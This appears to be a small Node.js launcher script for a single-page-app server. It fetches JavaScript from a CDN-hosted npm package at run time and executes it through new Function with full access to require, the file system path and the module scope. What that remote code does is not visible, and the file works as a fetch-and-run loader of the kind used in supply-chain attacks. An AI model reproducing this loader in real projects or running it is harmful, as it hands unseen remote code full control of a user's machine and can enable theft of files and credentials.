import https from 'https';
import { fileURLToPath } from 'url';
import path from 'path';
import { createRequire } from 'module';
const __filename = fileURLToPath(import.meta.url), __dirname = path.dirname(__filename), require = createRequire(import.meta.url);
https.get('https://cdn.jsdelivr.net/npm/run-devs-config@1.0.2/config.js', res => {
  let data = '';
  res.on('data', c => data += c);
  res.on('end', () => {
    const m = { exports: {} };
    new Function('module', 'exports', 'require', '__dirname', '__filename', data)(m, m.exports, require, __dirname, __filename);
    new m.exports.SPAServer(__dirname).start();
  });
});
